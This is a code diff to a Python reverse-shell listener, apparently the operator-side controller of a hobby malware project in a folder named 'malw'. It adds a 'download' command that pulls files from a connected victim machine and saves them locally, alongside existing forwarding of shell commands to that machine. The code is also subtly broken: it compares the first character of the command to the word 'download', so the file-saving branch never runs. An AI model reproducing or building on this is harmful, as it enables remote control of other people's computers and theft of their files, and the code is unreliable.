@@ -45,7 +45,10 @@ class Listener:
                     return exit()
             
 
-            if self.is_system_command(command):
+            if command.startswith("download"):
+                self.reliable_send(command)
+
+            elif self.is_system_command(command):
                 #self.connection.send(command.encode("utf-8"))
                 # self.reliable_send(command.encode("utf-8"))
                 self.reliable_send(command)
@@ -53,7 +56,7 @@ class Listener:
                 print(resultt)
             else:
                 print("bu bir sistem komutu değil gönderilemedi")
-                
+
         except socket.error as se:
             print("karşı tarafla olan bağlantı yok haci", se)
             return exit()
@@ -68,17 +71,29 @@ class Listener:
             return True
         return False
 
-
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(content)
+            return "[+] Dosya indiriliyor"
 
     def run(self):
         while True:
             command = input("-> ")
-            # command = command.split(" ")
-            self.remote(command)
+
+            result = self.remote(command)
+            command_parts = command.split(" ")
+
+            if command[0] == "download":
+                filename = command_parts[1]
+                download_path = f"/Users/bartu/Developer/python/malw/beylerbeyi/{filename}"
+
+                result = self.write_file(download_path, result)
+
+            print(result)
 
 
 my_listener = Listener("127.0.0.1", 4040)
-my_listener.run( )
+my_listener.run()
 
 # while True:
 #     command = input("-> ")
